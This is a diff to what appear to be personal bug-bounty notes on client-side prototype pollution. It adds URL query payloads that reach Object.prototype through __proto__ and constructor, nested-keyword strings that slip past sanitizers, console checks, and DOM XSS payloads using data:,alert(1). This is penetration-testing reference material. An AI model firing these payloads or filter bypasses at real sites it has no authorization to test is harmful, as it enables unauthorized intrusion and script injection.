@@ -54,3 +54,31 @@
     17. Repeat this process for any properties that you think are potential gadgets.
   - https://gowthams.gitbook.io/bughunter-handbook/list-of-vulnerabilities-bugs/prototype-pollution
   - DOM invador is the way to go, makes life much easier, note: sometimes extra chars like `1` is being appended like this`if(manager && manager.sequence){ manager.macro(ar2z0fxj6prototypepollutionsequencear2z0fxj1) }` so add `-` in the end to ignore the 1.
+
+### Via the constructor
+	- sometimes the `__proto__` accessor is blocked, we maybe able to use `constructor` property.
+### quick check
+https://example.com/?__proto__[foo]=bar
+https://example.com/?__proto__.foo=bar
+https://example.com/?constructor.[prototype][foo]=bar
+https://example.com/?constructor.prototype.foo=bar
+# Bypass sanitization
+https://example.com/?__pro__proto__to__[foo]=bar
+https://example.com/?__pro__proto__to__.foo=bar
+https://example.com/?constconstructorructor[prototype][foo]=bar
+https://example.com/?constconstructorructor.prototype.foo=bar
+https://example.com/?constconstructorructor[protoprototypetype][foo]=bar
+https://example.com/?constconstructorructor.protoprototypetype.foo=bar
+
+Check in browser
+Object.prototype.foo
+constructor.prototype.foo
+
+// the expected output: "bar"
+
+# DOM XSS
+https://example.com/?__proto__[source_url]=data:,alert(1);
+https://example.com/?__proto__[source_url]=data:,alert(1);
+https://example.com/?__proto__[source_url]=alert(1)-
+
+
